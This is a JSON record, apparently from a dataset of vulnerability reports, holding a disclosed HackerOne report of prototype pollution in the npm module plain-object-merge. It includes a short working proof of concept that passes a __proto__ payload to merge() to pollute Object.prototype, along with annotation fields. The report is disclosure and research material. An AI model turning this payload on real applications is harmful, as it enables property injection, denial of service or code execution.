@@ -1,0 +1,38 @@
+{
+    "reported_to": "Node.js third-party modules",
+    "reported_by": "d3lla ",
+    "title": "[plain-object-merge] Prototype pollution",
+    "content": "\nI would like to report a prototype pollution vulnerability in plain-object-merge module.\nIt allows an attacker to inject properties on Object.prototype.\nModule\nmodule name: plain-object-merge\nversion: 1.0.1\nnpm page: https://www.npmjs.com/package/plain-object-merge\nModule Description\nExtremely fast function optimized for deep merging json-serializable plain objects.\nModule Stats\n[20] weekly downloads\nVulnerability\nVulnerability Description\nThe merge function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.\nSteps To Reproduce:\ninstall plain-object-merge module:\nnpm i plain-object-merge\nnpm i plain-object-merge\nCreate an object with __proto__ property and pass it to the merge function:\nCode 229 Bytes\n1\n2const merge = require('plain-object-merge');\n3const payload =  JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\n4const obj = {};\n5console.log(\"Before : \" + obj.polluted);\n6merge([{}, payload]);\n7console.log(\"After : \" + obj.polluted);\nOutput:\nCode 31 Bytes\n1\n2Before : undefined\n3After : yes\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v14.1.0\nNPM VERSION: 6.14.5\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nThe impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Modification of Assumed-Immutable Data (MAID)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1615681800,
+    "report_url": "https://hackerone.com/reports/871156",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Install the plain-object-merge module: npm i plain-object-merge"
+        ],
+        [
+            2,
+            "Create an object with __proto__ property and pass it to the merge function: const merge = require('plain-object-merge'); const payload = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}'); const obj = {}; console.log(\"Before : \" + obj.polluted); merge([{}, payload]); console.log(\"After : \" + obj.polluted);"
+        ]
+    ],
+    "vuln_description": "The merge function in plain-object-merge module can be used to add/modify properties of the Object prototype, leading to prototype pollution. This allows an attacker to inject properties that will be present on all objects.",
+    "reason": "The vulnerability involves a straightforward manipulation of the __proto__ property in a JSON object, which is a well-known technique for prototype pollution. The attack does not require complex interactions or state manipulations, and the logic is commonly understood in security research.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
